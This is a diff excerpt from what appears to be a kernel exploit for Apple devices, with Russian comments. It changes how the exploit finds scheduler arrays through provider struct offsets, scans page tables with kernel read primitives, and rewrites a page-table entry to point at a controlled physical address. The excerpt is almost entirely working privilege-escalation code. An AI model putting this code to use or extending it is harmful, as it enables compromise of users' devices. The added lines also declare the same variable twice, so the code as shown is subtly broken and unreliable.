@@ -6663,9 +6663,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // живёт в scheduler array: [pipe+0xb8] → [sched+0xc8]. Матч по
         // [ep+0x788]==surfVA (credit после execute сброшен; записи висят в
         // массиве и после completion — UAF-опыт teardown'а это доказал).
-        if (kpLooksLikeKernelPointer(pipeVA) && surfVA) {
-            uint64_t schVA = kp_untag_ptr(early_kread64(pipeVA + 0xb8));
-            uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
+        if (kpLooksLikeKernelPointer(provVA) && surfVA) {
+            // 1.9.175 (р.44): «scheduler» credit-pass = сам provider — массивы в
+            // нём: pending [provider+0xc8] (count [provider+0xb8]), credited
+            // [provider+0x110] (count2 [provider+0x100]). [pipe+0xb8] = per-pipe
+            // очередь (u16-таблица, не записи).
+            uint64_t schVA = provVA;
+            uint64_t earr = kp_untag_ptr(early_kread64(provVA + 0xc8));
             kpNote(r, [NSString stringWithFormat:@"  [P2] scheduler=%#llx arr=%#llx — матч записей по [ep+0x788]==surfVA / [ep+0x48]==ucVA",
                       (unsigned long long)schVA, (unsigned long long)earr]);
             if (kpLooksLikeKernelPointer(earr)) {
@@ -6821,7 +6825,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // 1.9.174: многоуровневый скан — leaf-таблицы на 2-3 хопа ниже корней.
             // valid=bit0, child VA=(entry<<4)&0x3ffffffc000 (р.38). Visited-cap
             // 64 + kvtophys на каждой странице — безопасно и без зацикливания.
-            __block uint64_t visited[64];
+            __block int nvis = 0;
+            uint64_t *visited = (uint64_t *)malloc(64 * sizeof(uint64_t));   // heap-указатель: блоки массивы не захватывают (CI error 6831)
             __block int nvis = 0;
             __block void (^scanTbl)(uint64_t, int);
             scanTbl = ^void(uint64_t tblVA, int depth) {
@@ -6851,6 +6856,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             };
             for (int g = 0; g < gn && !pteVA; g++) scanTbl(gptrs[g], 0);
             if (!pteVA) kpNote(r, [NSString stringWithFormat:@"  [P2] многоуровневый скан: %d страниц обойдено, PTE нет", nvis]);
+            free(visited);
         }
         if (pteVA) {
             uint64_t newPTE = (origPTE & ~0x000003FFFE000000ULL) | (ctlPA & 0x000003FFFE000000ULL);
